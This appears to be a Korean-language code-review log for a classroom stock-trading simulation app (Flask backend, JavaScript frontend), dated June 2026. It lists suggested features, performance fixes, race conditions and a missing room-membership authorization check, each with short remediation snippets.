- **`RoomHolding.avg_price` 음수/0 저장 가능 → 포트폴리오 손익 왜곡** (`app.py:1037-1040`, `app.py:1318-1319`): 룰렛 베팅·퀴즈 패널티에서 보유 주식을 강제 처분할 때 `h.shares = 0; h.avg_price = 0`을 저장하고 `db.session.delete(h)`를 하지 않음 (2026-06-22 기존 분석에서 누락 지적했으나 avg_price=0 파생 문제는 미언급). 이후 `get_portfolio()` 에서 `h.shares <= 0` 조건으로 필터링하면 숨겨지지만, 추후 같은 종목을 재매수하면 `holding.avg_price * holding.shares + amount) / ns` 계산에서 avg_price=0이 사용됨. 0 * 0 = 0이어서 수식 자체는 맞지만 `h.avg_price = 0` 인 레코드와 다음 매수가 합산될 때 `holding.shares = 0`이므로 분모가 `shares`(=0)로 시작해 ZeroDivisionError 가능. `if holding and holding.shares == 0: db.session.delete(holding); holding = None` 처리 후 새로 `RoomHolding` 생성하면 모호성 제거.

---

## 2026-06-24

### 추가하면 좋을 기능

- **QR코드 URL에서 방 코드 자동 채우기** (`app.js:196-205`, `index.html:315-334`): `_makeQR()`이 `${location.origin}${location.pathname}?code=${S.room.code}` URL을 QR에 인코딩하지만, 페이지 로드 시 `?code=` 파라미터를 읽어 `join-code` 입력란에 자동으로 채우는 로직이 없음. 학생이 QR을 스캔해 접속해도 여전히 6자리 코드를 수동 입력해야 해 QR 편의성이 반감됨. `DOMContentLoaded`에서 `const autoCode = new URLSearchParams(location.search).get('code'); if (autoCode) { document.getElementById('join-code').value = autoCode.toUpperCase(); showScreen('screen-join'); }` 10줄 이내 코드로 해결 가능하며, 학생 입장 시간을 단축해 수업 시작을 빠르게 할 수 있음.

- **`api` 래퍼 네트워크 오류 핸들링 없음** (`app.js:29-44`): `api.get/post/del` 세 메서드 모두 `await fetch(url)` 이후 `.ok` 체크만 하고, DNS 실패·타임아웃·연결 거부 등 `fetch()`가 reject될 때는 처리가 없음. Wi-Fi가 불안정한 교실 환경에서 네트워크가 잠깐 끊기면 `Uncaught TypeError: Failed to fetch`가 콘솔에만 출력되고 UI는 아무 피드백 없이 멈춤. `async get(url) { try { const r = await fetch(url); ... } catch(e) { return {error: '네트워크 오류 — 연결을 확인하세요'}; } }` 패턴으로 세 메서드에 try-catch를 추가하면 학생이 오류를 인지하고 재시도할 수 있음.

- **강퇴된 학생의 재입장 방지 없음** (`app.py:564-575`, `app.py:392-406`): `kick_member()`는 `RoomMember` 행만 삭제하고 재입장 금지 처리가 없어, 강퇴당한 학생이 같은 코드로 `join_room()`을 즉시 다시 호출하면 재입장이 허용됨. `Room` 모델에 `kicked_users = db.Column(db.Text, default='')` 컬럼을 추가해 `kick_member()` 시 user_id를 콤마 구분으로 저장하고, `join_room()`에서 `if str(user.id) in (room.kicked_users or '').split(',')` 체크 후 403을 반환하면 됨. 대안으로 `RoomMember`에 `kicked = db.Column(db.Boolean, default=False)` 플래그를 두고 삭제 대신 비활성화하는 방식도 가능.

- **진행자 화면에서 룰렛 진행 상황 알 수 없음** (`app.py:948-963`, `index.html:135-142`): 룰렛 미니게임이 자동 트리거되면 진행자 화면에 "게임 일시정지" 표시 외에 몇 명이 아직 룰렛을 진행 중인지 알 방법이 없음. `_rlt_active[rid]['count']`(현재 미니게임을 열고 있는 학생 수)를 `room_dict()` 에 `rlt_open_count` 필드로 추가하고(`app.py:288-305`), 진행자 게임 화면의 상태바에 "룰렛 진행 중: N명 남음" 텍스트를 표시하면 교사가 모든 학생이 완료할 때까지 기다릴 수 있음. 서버 1줄 + 클라이언트 3줄 이내로 구현 가능.

- **`S.watchlist`가 모든 방/세션에서 공유됨** (`app.js:17`): `new Set(JSON.parse(localStorage.getItem('watchlist') || '[]'))`로 초기화해 학번·방 구분 없이 동일한 관심종목 목록을 사용함. 1학기 게임에서 등록한 종목이 새 학기 새 방에서도 별표가 켜진 채 표시되어 혼란 가능. `S.room`이 확정된 후 `'watchlist-' + S.room.id` 키로 로드/저장하도록 `enterParticipantGame()` 시점에 갱신하면 방별로 독립된 관심종목이 유지됨. `S.watchlist` 초기화는 `app.js:17`에서 일단 비우고(`new Set()`), `enterParticipantGame()` 안에서 `S.watchlist = new Set(JSON.parse(localStorage.getItem('watchlist-' + S.room.id) || '[]'))` 로 갱신하는 패턴 권장.

- **복권·룰렛 결과를 거래 내역 UI에서 식별하기 어려움** (`app.js:522-535`, `index.html:394-403`): 거래 내역 목록에서 `action === 'RLT'`(룰렛) 또는 `symbol === 'LOTTO'`(복권)인 항목은 일반 매수/매도와 같은 스타일로 표시됨. 현재 `txn-badge` 클래스는 `buy`·`sell`·`adj` 세 가지인데 `rlt`와 `lotto` 전용 뱃지(🎰 룰렛, 🎟 복권)를 추가하면 학생이 게임 후 포트폴리오 탭에서 미니게임 수익/손실을 빠르게 파악 가능. CSS 2줄 + 렌더링 조건 분기 1줄로 구현 가능하며, 게임 종료 후 토론에서 "미니게임이 내 순위에 얼마나 영향을 줬나" 교육 토론 자료로 활용 가능.

---

### 제거/단순화할 것들

- **`RoomTransaction` 테이블에 복합 인덱스 없음** (`models.py:68-79`): `RoomTransaction`에 `(room_id, user_id)` 복합 인덱스가 없어, 자주 호출되는 `.filter_by(room_id=rid, user_id=uid)` 패턴(거래 내역 조회, 룰렛 스핀 횟수 카운트 등)이 테이블 전체 스캔을 수행함. 학생 30명이 각 100건 거래하면 3,000행, 복권까지 더하면 더 많아짐. `__table_args__ = (db.Index('ix_txn_room_user', 'room_id', 'user_id'),)` 한 줄을 `RoomTransaction` 클래스에 추가하면 됨. SQLite/PostgreSQL 모두 지원하며 마이그레이션 없이 `db.create_all()`로 생성 가능 (기존 DB에는 `CREATE INDEX IF NOT EXISTS ix_txn_room_user ON room_transactions(room_id, user_id)` 실행 필요).

- **자산 청산 로직이 `minigame_spin()`과 `submit_quiz()`에서 35줄씩 중복** (`app.py:1022-1057`, `app.py:1302-1338`): 현금 부족 시 ① 보유 주식을 가치 높은 순으로 매각 → ② 남은 부족분을 예금 인출로 충당하는 로직이 거의 동일하게 두 곳에 복사되어 있음. `_liquidate_for_amount(rid, uid, member, shortfall, note_prefix)` 헬퍼 함수로 추출하면 코드 70줄이 함수 1개 + 호출 2줄로 압축됨. 향후 세금·벌금·이벤트 같은 차감 기능 추가 시에도 동일 헬퍼를 재사용 가능.

- **`_rlt_active` 딕셔너리가 서버 재시작 후 소실되어 룰렛 미완료 상태 복구 불가** (`app.py:252`, `app.py:466-468`): `_lots`(복권)은 `room.lottery_rounds_done` DB 컬럼으로 완료 회차를 복구하지만(`app.py:174-178`), `_rlt_active`는 별도 복구 로직이 없음. `room.rlt_triggered == True && room.status == 'paused'`인 방은 `app.py:467-468`에서 `_rlt_active[rid]`를 재초기화하지만 `count`가 항상 0으로 복구됨. Render 재시작 후 룰렛 진행 중이던 학생들의 클로즈 요청이 `count == 0`을 감지해 게임을 바로 종료하거나 영구 일시정지 상태에 빠질 수 있음. 단기 해결책: 재시작 복구 시 `count`를 0 대신 `RoomMember` 수로 초기화하고, 각 `minigame/close` 호출에서 count를 감소시키도록 현재 로직을 유지.

- **QR코드 색상 반전으로 구형 스캐너에서 인식 실패 가능** (`app.js:200-205`): `colorDark: '#e6edf3'` (밝음), `colorLight: '#0d1117'` (어두움)으로 설정되어 표준 QR코드의 흑백 배치가 뒤집혀 있음. QR코드 표준(ISO/IEC 18004)은 어두운 모듈이 밝은 배경 위에 있어야 함을 권장하며, 구형 Android 카메라 앱이나 일부 교실 태블릿에서 반전 QR 인식 실패 사례가 있음. `colorDark: '#000000'`, `colorLight: '#FFFFFF'`로 변경하고 QR 컨테이너에 `padding: 8px; background: #fff; border-radius: 8px` 인라인 스타일을 추가하면 호환성 문제 없이 다크 테마에서도 자연스럽게 표시됨 (`app.js:200-205`, `index.html:93`, `index.html:657`).

- **`_get_room_cached()` 캐시 히트 시 불필요한 딕셔너리 전체 복사** (`app.py:51-64`): `d = dict(entry['data'])`로 캐시 데이터 전체를 복사한 뒤 `d['is_host'] = uid == room.host_id` 한 줄을 추가함. `is_host`는 `room.host_id == uid` 비교이므로 캐시에 `host_id`를 저장하고, 조회 시 `data = dict(entry['data']); data['is_host'] = (uid == data['host_id'])` 로 변경하면 코드 의도가 더 명확해짐. 더 나아가 참조 공유로 인한 캐시 오염을 방지하려면 `copy.copy()` 대신 필요한 필드만 새 딕셔너리로 조립하는 방식이 안전함 (`app.py:55-59`).

- **`get_room()` 라우트에서 `_auto_start_lottery_if_due()` 호출이 모든 멤버 폴링마다 실행됨** (`app.py:470`, `app.py:408-430`): 참여자 30명이 10초마다 `GET /api/rooms/<rid>` 폴링 → 30개 동시 요청 → `_auto_start_lottery_if_due()` 30번 호출. 내부에 `_lottery_lock`이 있어 중복 실행을 방지하지만, 잠금 획득 전에도 `room.status != 'active'` 체크 이후 `_lot_round_due()` 계산이 매번 수행됨. 복권 자동 시작 조건은 `_room_cache`가 만료될 때(1.5초 TTL) 한 번만 확인하면 충분하므로, `_auto_start_lottery_if_due()` 호출을 캐시 미스 경로에만 두거나, `_lot_round_due()` 결과도 캐시하면 30 × 초당 0.67회 = 초당 20회의 중복 계산을 제거할 수 있음.

---

## 2026-06-24 (2차)

### 추가하면 좋을 기능

- **진행자 "종목 개별 잠금" 기능** (`stock_service.py:174-190`, `app.py:673-687`): 현재 시장 이벤트는 섹터 전체 가격을 한 번에 움직이지만, 특정 종목만 수업 주제로 부각시키기 위해 해당 종목 가격을 일정 시간 고정하는 기능이 없음. `StockService`에 `_locked_until: dict[str, float] = {}` 필드를 추가하고, `tick()` 내 가격 업데이트 시 `if time.time() < self._locked_until.get(sym, 0): continue` 한 줄로 건너뜀. 잠금 해제 POST 엔드포인트(`/api/rooms/<rid>/host/lock-stock`) 하나와 호스트 UI 토글 버튼만 추가하면 완성. 학생들에게 "이 종목은 지금 거래 동결 중" 안내도 가능해짐.

- **학생별 투자 성향 분석 뱃지** (`models.py:68-79`, `app.js:1694`): 게임 종료 후 결과 화면에서 `RoomTransaction` 패턴을 분석해 "단타형(평균 보유 시간 < 5분)", "분산형(3개 이상 종목 보유)", "집중형(한 종목 비중 70% 이상)" 같은 투자 성향 뱃지를 표시함. 서버 측 `/api/rooms/<rid>/my-analysis` 엔드포인트에서 `RoomTransaction.query.filter_by(room_id=rid, user_id=uid)` 조회 후 집계, 또는 `loadResults()` 내에서 이미 있는 `S.txns` 배열로 클라이언트 계산 가능. 추가 DB 쿼리 없이 기존 데이터로 구현 가능하며 수업 마무리 토론 자료로 활용됨.

- **거래 내역에 현재가 대비 수익률 표시** (`app.js:1569-1591`): `loadTxn()`에서 거래 목록을 렌더링할 때 `t.price`(체결가)와 `S.stocks.find(s => s.symbol === t.symbol)?.price`(현재가)를 비교해 `((현재가 - 체결가) / 체결가 * 100).toFixed(1)%` 값을 각 거래 행에 작은 뱃지로 표시함. BUY 거래에는 현재 평가 손익이, SELL 거래에는 매도 후 주가 변동이 보여 "팔고 나서 더 올랐다" 같은 학습 포인트를 즉시 시각화할 수 있음. 이미 `S.stocks`가 폴링으로 최신 상태이므로 추가 API 호출 없이 구현 가능.

- **진행자 시장 탭 종목별 보유 학생 수 표시** (`app.py:651-671`, `models.py:57-65`): `/api/rooms/<rid>/stocks` 응답에 `holder_count` 필드를 추가함. `db.session.query(RoomHolding.symbol, func.count(RoomHolding.user_id)).filter(RoomHolding.room_id == rid, RoomHolding.shares > 0).group_by(RoomHolding.symbol).all()` 단일 쿼리로 전 종목의 보유자 수를 한 번에 조회해 딕셔너리로 변환한 뒤 stocks 리스트에 병합. 진행자 화면 종목 카드에 "N명 보유" 뱃지를 띄우면 "가장 인기 있는 종목" 현황을 실시간으로 파악하고 수업 포인트로 활용 가능.

- **게임 중 목표 수익률 달성 알림** (`app.js:735-753`): `localStorage.setItem('gain-target-' + S.room.id, threshold)` 로 룸별 목표 수익률을 저장하고, `refreshMyRank()` 내 `me.gain_pct`가 임계값을 최초로 넘는 순간 `toast('🎯 목표 달성!')` + `navigator.vibrate?.([200])` 을 호출함. `S._gainTargetNotified` 플래그로 중복 알림 방지. 서버 변경 없이 10줄 이내로 구현 가능하며, 수업 전 교사가 "오늘의 목표: +10%" 같은 미션을 제시할 때 즉각적인 피드백을 제공함.

- **`loadPortfolio()` 도넛 차트 `update()` 패턴으로 교체** (`app.js:1486-1510`): `if (S.portChart) S.portChart.destroy(); S.portChart = new Chart(ctx, {...})` 패턴이 포트폴리오 탭 진입마다 실행됨. `S.portChart`가 이미 존재할 때는 `S.portChart.data.labels = labels; S.portChart.data.datasets[0].data = values; S.portChart.update()` 로 데이터만 교체하면 DOM 재생성 없이 애니메이션과 함께 부드럽게 업데이트됨. `loadChart()` (`app.js:1376`)도 동일한 패턴으로 고쳐야 하며, 두 곳 모두 수정하면 차트 깜빡임과 메모리 누수가 동시에 제거됨.

---

### 제거/단순화할 것들

- **`host_market_event()` 에서 뉴스 캐시 무효화 누락** (`app.py:1345-1360`): `stock_service.force_sector_event()` 내부에서 `self._news`를 업데이트(`stock_service.py:244-276`)하지만, `app.py:1360` 반환 전에 `_invalidate_news_cache(rid)` 호출이 없음. `host_send_news()` (`app.py:700`)는 동일 함수를 호출하는데 반해 누락된 것. 결과적으로 섹터 이벤트 직후 학생 클라이언트는 최대 2초간 구 뉴스를 읽음. `return jsonify({'ok': True})` 바로 위에 `_invalidate_news_cache(rid)` 한 줄 추가로 수정.

- **`lottery_start()` 중복 시작 방지 체크가 `_lottery_lock` 바깥에서 실행됨** (`app.py:1088-1090`): `lot.get('current')` 확인 후 `lot['current'] = {...}` 할당까지의 과정이 `_lottery_lock` 획득 전에 이루어짐. 두 요청이 동시에 None 체크를 통과하면 복권 라운드가 중복 시작됨(네트워크 재시도·이중 클릭 상황). 라인 1088 check와 1094 assignment를 모두 `with _lottery_lock:` 블록 안으로 이동시켜야 함. 현재 lock은 라인 1092에서만 진입하므로, 전체 체크+할당 구간을 하나의 `with` 블록으로 감싸도록 수정 필요.

- **`loadChart()` 기간 탭 클릭마다 Chart.js 인스턴스 파괴 후 재생성** (`app.js:1376`): `if (S.stockChart) S.stockChart.destroy(); S.stockChart = new Chart(ctx, cfg)` 가 1d/5d/1mo/3mo 탭 전환 때마다 실행됨. 이미 `renderHostBarChart()`에 적용된 `chart.data.labels = ...; chart.data.datasets[0].data = ...; chart.update()` 패턴으로 교체하면 탭 전환 시 깜빡임이 없어지고 GC 압력도 줄어듦. 색상(상승·하락 borderColor)만 `chart.data.datasets[0].borderColor = color; chart.data.datasets[0].backgroundColor = color + '33'` 으로 별도 갱신하면 됨.

- **`minigame_spin()` 예금 부분 차감 후 이자 계산 기반 오류** (`app.py:1048-1058`): 현금 부족 시 `dep.amount -= take` 로 원금만 줄이고 `dep.status`는 `'active'`로 유지함. `_end_room()` 에서 이자를 `d.amount * d.rate / 100 * ratio` (`app.py:140`)로 계산하므로 차감된 원금에만 이자가 붙어 학생이 원래 예금한 금액 대비 과소 이자를 받음. 수정 방법: 기존 `Deposit`을 `'withdrawn'`으로 닫고, 남은 금액(`dep.amount - take`)으로 새 `Deposit`을 `created_at=now`로 생성하면 이자 계산 기반이 정확해짐. 또는 부분 차감을 허용하되 `interest_base` 컬럼을 별도 관리하도록 모델 변경 필요.

- **`get_stocks()` 방 소속 검증 없어 타 방 주가 열람 가능** (`app.py:651-654`): `@login_required` 만 적용되어 있어 로그인한 모든 사용자가 임의의 `rid`로 `GET /api/rooms/<rid>/stocks` 를 호출해 해당 방의 실시간 시뮬레이션 주가를 읽을 수 있음. 방마다 독립적으로 가격이 형성(`stock_service.py:80-130`)되므로 정보 비대칭 발생 우려가 있음. `Room.query.get_or_404(rid)` 직후 `if not (room.host_id == cur_user().id or RoomMember.query.filter_by(room_id=rid, user_id=cur_user().id).first()): return jsonify({'error': '권한 없음'}), 403` 조건을 추가해야 함.

- **`RoomTransaction.action` 컬럼 길이가 4자로 제한되어 'LOTTO' 저장 불가** (`models.py:73`): `db.Column(db.String(4))` 로 선언되어 있어 'BUY'·'SELL'·'ADJ'는 저장되지만, 복권 당첨 트랜잭션 종류를 'LOTTO'(5자)로 추가하려면 마이그레이션 필요. 현재는 복권 당첨금을 `action='ADJ'`, `note='복권 당첨'`으로 우회 저장 중(`app.py:1143`)이어서 거래 유형 필터링이 불가능함. `db.String(10)` 으로 늘리고 전용 `action='LOTTO'` 값을 사용하면 거래 내역 조회·엑셀 내보내기 시 복권 수익을 명확히 구분할 수 있음.

---

## 2026-06-25

### 추가하면 좋을 기능

- **룰렛 베팅 초과 시 주식 자동 청산 사전 경고 모달** (`app.py:1022-1058`, `app.js:1033-1048`): 현금이 부족할 때 `minigame_spin()`이 서버 측에서 보유 주식을 자동 매도하여 베팅금을 충당함. 그러나 프론트엔드는 이 사실을 알리지 않고 바로 스핀 요청을 전송함(`app.js:1048` → `api('POST', ...)`). 주식이 청산된 학생은 자신이 왜 주식을 잃었는지 모름. 베팅 확인 모달(`index.html`의 룰렛 BET 버튼 로직)에 "현금이 부족하면 보유 주식이 자동 매각됩니다" 경고 문구를 추가하고, 서버 응답에 `sold_stocks: [{symbol, shares, price}]` 필드를 포함시켜 청산된 내역을 팝업으로 보여줘야 함.

- **진행자 시장 탭 섹터/종목 검색 필터** (`app.js:314-358`, `index.html:161-208`): 참가자 화면에는 섹터 필터 버튼이 구현되어 있지만 진행자의 시장 탭(`renderHostMarket()`, `app.js:314`)에는 없어 47개 종목이 모두 나열됨. 진행자가 특정 종목의 시세를 빠르게 확인하거나 강제 조작(`host_force_price()`)할 종목을 찾으려면 스크롤을 해야 함. 참가자 탭의 섹터 필터(`app.js:2088-2120`)와 검색 인풋 로직을 `renderHostMarket()`에도 동일하게 적용하면 됨.

- **퀴즈 일시 비활성화 토글** (`app.py:1248-1270`): 게임 진행 중 진행자가 수업 흐름에 따라 퀴즈를 잠깐 꺼두고 싶을 때 방법이 없음. 현재는 퀴즈를 시작하면(`quiz_start()`, `app.py:1270`) 종료 전까지 학생이 언제든 답할 수 있음. `_quiz_state[rid]`에 `'paused': True` 플래그를 추가하고, `quiz_answer()`(`app.py:1290`)에서 해당 플래그를 확인해 일시 중지 중에는 접수를 거부하면 됨. 진행자 UI에 "퀴즈 일시중지" 버튼을 추가해 제어 가능하게 할 것.

- **룰렛 자동 닫기 타이머가 결과 확인 중에도 계속 진행** (`app.js:972-997`, `app.js:1090-1095`): 룰렛 모달이 열릴 때 60초 자동 닫기 타이머(`_rltAutoCloseTimer`)가 시작됨. 스핀 애니메이션이 끝나고 결과 메시지가 표시되는 동안에도 타이머는 계속 돌아서, 학생이 결과를 읽다가 모달이 갑자기 닫힐 수 있음. 결과가 표시되는 시점(`app.js:1090`의 `showRltResult()` 호출 시)에 기존 타이머를 `clearTimeout(_rltAutoCloseTimer)`로 취소하고, 결과 확인 후 30초의 새 타이머를 재시작하도록 수정해야 함.

- **복권 상금 기본값이 학생 수 × 3천만 원으로 비현실적** (`app.py:418-419`, `app.js:2041-2042`): `lottery_start()` 기본 상금은 `member_count * 30_000_000`으로, 30명 참가 시 9억 원이 기본값으로 설정됨. 수업 시작금(기본 1,000만 원)보다 훨씬 크기 때문에 복권 한 번으로 순위 역전이 발생하고 게임 밸런스가 깨짐. 기본값을 `starting_cash * 0.1`(시작금의 10%) 정도로 낮추거나, 상금 입력 필드에 권장 범위 안내 문구를 표시할 것.

### 제거/단순화할 것들

- **`api` 래퍼가 HTTP 오류 시 서버의 실제 오류 메시지를 버림** (`app.js:29-45`): `if (!r.ok) return {error: 'HTTP ${r.status}'}` 로 하드코딩된 문자열을 반환하므로, Flask가 `jsonify({'error': '현금이 부족합니다'})` 를 보내도 화면에는 "HTTP 400"만 표시됨. `r.json().catch(...)` 로 서버 JSON을 먼저 파싱한 뒤 `body.error || 'HTTP ${r.status}'` 를 사용하면 학생이 왜 거래가 실패했는지 즉시 알 수 있음. 단 3줄 수정으로 UX가 크게 개선됨.

- **`_news_cache` TTL(2초)과 프론트엔드 뉴스 폴링 주기(8초) 불일치** (`app.py:69`, `app.js:810`): 뉴스 캐시 만료(2초)가 훨씬 빠르기 때문에 8초마다 오는 폴링 요청은 항상 캐시 미스 상태에서 처리됨. `_news_cache` TTL을 `NEWS_CACHE_TTL = 8`로 올리거나(폴링 주기와 맞춤), 뉴스는 가격 변동 시에만 갱신되므로 `_invalidate_news_cache(rid)`를 호출하는 시점(`stock_service.py`의 `tick()` 완료 후)에만 캐시를 갱신하는 방식으로 단순화하면 캐시가 실질적으로 동작하게 됨.

- **`host_adjust()` 와 `lottery_skip()` 의 숫자 변환에 try/except 없음** (`app.py:592`, `app.py:1215`): `delta = float(d.get('delta', 0))`와 `round_n = int(d.get('round', 1))`는 프론트엔드가 비정상 값을 보내면 `ValueError`를 발생시켜 500 에러로 이어짐. 각 줄을 `try/except ValueError: return jsonify({'error': '잘못된 입력'}), 400` 으로 감싸면 됨. 두 곳 모두 5줄 미만의 수정으로 방어 가능.

- **`RoomTransaction`의 `symbol` 컬럼에 'DEPOSIT'·'ROULETTE'·'LOTTERY' 더미값 혼재** (`app.py:600`, `app.py:1064`, `app.py:1143`): 예금·룰렛·복권 거래는 실제 종목 심볼 대신 더미 문자열을 `symbol`에 저장함. 이 때문에 거래 내역 화면에서 종목 차트를 클릭하거나 필터할 때 존재하지 않는 심볼이 섞임. `symbol` 컬럼을 nullable로 변경하고(`db.Column(db.String(20), nullable=True)`), 종목 무관 거래는 `symbol=None`으로 저장한 뒤 UI에서 None인 경우 심볼 대신 거래 유형 레이블을 표시하도록 정리할 것.

- **`refreshMyRank()` 가 전체 순위 배열을 받아 자기 항목만 추출** (`app.js:735-753`): 30명 방에서 `/api/rooms/<rid>/rankings` 전체를 10초마다 받아 `find()`로 내 항목만 꺼냄. 참가자가 순위 탭을 보지 않아도 폴링됨. 백엔드에 `GET /api/rooms/<rid>/my_rank` 엔드포인트를 추가해 본인 순위·자산만 반환하거나, 순위 탭이 열려 있을 때만 전체 순위를 요청하는 조건을 추가하면 불필요한 DB 쿼리를 줄일 수 있음.

---

## 2026-06-25 (2차)

### 추가하면 좋을 기능

- **시장 탭 상단 가로 스크롤 주가 티커 마퀴** (`app.js:1229-1270`, `static/css/style.css`): `loadMarket()` 이후 이미 `S.stocks` 배열에 모든 종목 현재가·등락률이 담겨 있음. 이 데이터를 활용해 상승/하락 상위 10개 종목을 CSS `@keyframes marquee` + `overflow: hidden` 컨테이너로 횡스크롤 표시하면 서버 변경 없이 실시간 주가 흐름을 한눈에 볼 수 있음. `renderGrid()` 호출 직후 `updateTicker(S.stocks)` 를 추가하고 10줄 이내의 JS + CSS로 구현 가능.

- **게임 중 진행자 예금 금리 실시간 변경 이벤트** (`app.py:878-903`, `models.py:82-92`): 현재 `deposit_rate`는 방 생성 시 설정되면 변경 방법이 없음. `Deposit.rate`는 가입 시점에 복사 저장되므로(`models.py:88`) 기존 예금에는 영향이 없고 새 예금에만 신규 금리가 적용됨. `POST /api/rooms/<rid>/host/deposit-rate` 엔드포인트를 추가해 `room.deposit_rate`를 갱신하고, 진행자 UI에 슬라이더를 노출하면 중앙은행 기준금리 결정 수업 시나리오를 실제 게임 안에서 구현할 수 있음.

- **게임 결과 화면 투자 스타일 자동 라벨링** (`app.py:808-824`, `app.py:1417-1488`): 게임 종료 후 `RoomTransaction` 기록을 분석해 거래 횟수·섹터 집중도·평균 보유 기간 지표를 산출하고 학생마다 "단타형 🔥"(50회 이상 거래), "장기보유형 💎"(평균 보유 5분 이상), "분산투자형 🌈"(5개 섹터 이상), "예금형 🏦"(현금 80% 이상)과 같은 레이블을 붙이면 됨. `get_rankings()` 응답에 `style_label` 필드를 추가하고 결과 화면 및 Excel 내보내기에 반영.

- **포트폴리오 탭 섹터별 비중 도넛 차트 토글** (`app.js:1456-1510`): 현재 포트폴리오 도넛 차트는 종목 단위로만 표시됨. 보유 종목의 `sector` 필드(`stock_service.py`의 `STOCKS` 딕셔너리에 있음)를 그룹화해 섹터별 비중으로 전환하는 "섹터별 보기" 버튼을 추가하면 됨. 서버 변경 없이 Chart.js `data.labels`와 `data.datasets[0].data`만 교체하는 10줄 수정으로 구현 가능하며, 포트폴리오 분산도를 직관적으로 파악할 수 있음.

- **진행자 특정 종목 서킷브레이커(거래 정지)** (`stock_service.py`, `app.py`): `StockService`에 `_halted: set` 속성을 추가하고 `freeze_symbol(rid, sym)` / `unfreeze_symbol(rid, sym)` 메서드를 구현. `app.py`의 `trade()` 엔드포인트에서 해당 심볼이 정지 목록에 있으면 `{'error': '거래 정지 종목입니다'}, 403` 반환. `get_stocks()` 응답에 `trading_halted: bool` 필드 포함. 진행자 호스트 시장 탭에서 종목별 정지 토글 버튼 노출. 주식시장 서킷브레이커 개념을 실습할 수 있음.

- **종목 카드 롱프레스 1주 즉시 매수** (`app.js:1287-1324`): `renderGrid()` 에서 생성되는 종목 카드에 `touchstart` 이벤트 핸들러를 등록해 500ms 이상 유지 시 모달 없이 `execTrade('BUY', symbol, 1)`을 직접 호출하는 기능. `localStorage`에 `quickBuyEnabled` 플래그를 두어 선택적으로 활성화. 수업 중 빠르게 1주씩 모아가는 장기투자 시나리오에서 모달 클릭 반복 없이 편리하게 매수할 수 있음.

### 제거/단순화할 것들

- **`create_room()` `starting_cash` 상한값 누락** (`app.py:384-385`): `starting_cash = max(100000, float(d.get('starting_cash', 10_000_000)))` 로 하한(10만)은 있지만 상한이 없음. 진행자가 1조 원을 입력하면 순위 표·Excel 컬럼 너비가 깨지고 소수점 float 정밀도 문제가 증폭됨. `min(starting_cash, 1_000_000_000)` 을 추가하고 HTML `<input max="1000000000">` 속성도 함께 설정할 것.

- **`lobby_members()` 유저 조회 N+1 쿼리** (`app.py:577-585`): `for m in members: db.session.get(User, m.user_id)` 를 멤버 수만큼 반복 실행함. 같은 파일의 `host_members()` (`app.py:550`)는 이미 `user_map = {u.id: u for u in db.session.query(User).filter(User.id.in_(uids)).all()}` 패턴으로 배치 조회함. `lobby_members()`도 동일 패턴으로 교체하면 30명 방 기준 DB 왕복 29회를 절감.

- **`doRouletteSpin()` 결과 수신 후 `_rltCash` 경쟁 조건** (`app.js:1064-1068`): 스핀 성공 시 `_rltCash = data.cash` (현금만)로 즉시 갱신한 뒤, 비동기로 `api.get(minigame)` 를 불러 `_rltCash = data.total_assets` 로 재갱신함. 이 짧은 사이에 `setRltPct(pct)` (`app.js:1028`)가 호출되면 보유 주식 평가액이 제외된 값으로 베팅 금액을 계산해 실제보다 낮은 금액이 입력됨. 베팅 컨트롤 재활성화를 minigame 재조회 완료 후로 미루거나 `await` 체인으로 순서를 보장해야 함.

- **`get_history()` `interval` 파라미터가 실제로 무시됨** (`stock_service.py:296-297`): `step = 86400` 이 고정값으로 사용되어 `interval='5m'`이든 `'1wk'`이든 항상 1일 간격으로 캔들이 생성됨. 프론트엔드가 "1일·1달·1년" 탭을 제공하지만 모든 탭의 차트가 동일하게 보임. `step_secs = {'5m': 300, '30m': 1800, '1d': 86400, '1wk': 604800}.get(interval, 86400)` 로 매핑한 뒤 `now - i * step_secs` 로 교체하면 탭별 다른 시간 해상도를 제공할 수 있음.

- **`startTimer()` 클라이언트 시계 의존으로 드리프트 발생** (`app.js:756-776`): `rem = Math.floor((new Date(S.room.end_time) - new Date()) / 1000)` 는 학생 기기의 시스템 시계를 그대로 사용함. 기기 시계가 ±1~2분 오차가 있으면 게임 내내 타이머가 다르게 표시됨. 서버가 이미 `room_dict()`에서 `remaining_seconds`를 계산해 반환하므로(`app.py` 내 `room_dict` 함수), 폴링 응답의 `remaining_seconds`와 클라이언트 측 경과 시간을 합산하는 `S.serverTimeOffset` 보정값을 도입하면 시계 오차를 제거할 수 있음.

- **호스트 폴링에서 `loadHostMembers()`와 `refreshRoomStatus()` 동시 실행으로 `S.room` 갱신 경쟁** (`app.js:269-273`, `app.js:1180-1207`): 호스트 `setInterval` 콜백이 두 함수를 `await` 없이 연속 호출해 둘 다 비동기로 실행됨. 응답 순서에 따라 먼저 도착한 `refreshRoomStatus()` 결과가 더 늦게 도착한 `loadHostMembers()` 의 부수 갱신을 덮어쓸 수 있음. 두 호출을 `await loadHostMembers(); await refreshRoomStatus();` 로 직렬화하거나 단일 엔드포인트로 통합해야 함.

---

## 2026-06-26

### 추가하면 좋을 기능

- **복권 오버레이 picking/waiting 상태에서 닫기 버튼 없음** (`index.html:476-509`, `app.js closeLotteryOverlay()`): `lottery-overlay`의 `lot-section-result`에만 닫기 버튼이 있고 `lot-section-picking`·`lot-section-waiting` 섹션에는 없음. 복권 도중 서버 에러나 네트워크 단절이 발생하면 참가자 화면이 오버레이에 고착됨. 각 섹션에 `closeLotteryOverlay()`를 호출하는 "닫기" 버튼(또는 ESC 키 핸들러)을 추가하고, 복권 진행 중에는 버튼을 비활성화(disabled)하되 5초 이상 응답이 없을 때 활성화하는 타임아웃 로직을 함께 추가하면 됨.

- **결과 화면에 "새 게임 만들기" 바로가기 버튼 누락** (`index.html:596-637`): 게임 종료 후 `screen-results`에는 "홈으로" 버튼(`id="btn-results-home"`)만 있어 교사가 연속 수업 시 홈 → 방 만들기 2단계를 거쳐야 함. `btn-results-home` 옆에 `doCreateRoom()` 또는 `showScreen('screen-host-create')`를 직접 호출하는 "새 게임 만들기" 버튼을 추가하면 1단계로 단축됨. 서버 변경 없이 HTML과 app.js 10줄 이내 수정으로 구현 가능.

